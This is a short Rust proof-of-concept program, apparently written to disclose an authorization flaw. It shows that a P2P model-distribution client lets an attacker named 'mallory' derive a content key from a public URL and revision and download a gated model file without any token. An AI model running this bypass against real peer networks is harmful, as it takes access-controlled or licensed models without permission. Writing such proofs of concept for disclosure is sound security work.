//! PoC unauthorized fetch: retrieves a model over P2P using ONLY the public
//! URL + revision. No HF token, no credentials of any kind are supplied.
//!
//! Args: <tracker_url> <gguf_url> <revision> <out_file>
use dragonfly_client_p2p as p2p;
use std::path::PathBuf;
use std::time::Duration;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let a: Vec<String> = std::env::args().collect();
    let (tracker, url, revision, out) = (&a[1], &a[2], &a[3], PathBuf::from(&a[4]));

    let key = p2p::content_key(url, revision, None);
    eprintln!("[mallory] computed content_key={key} from the public URL alone");
    eprintln!("[mallory] requesting bytes with NO token...");

    p2p::try_p2p_download(tracker, &key, &out, None, Duration::from_secs(20)).await?;
    eprintln!("[mallory] received file -> {out:?}");
    Ok(())
}
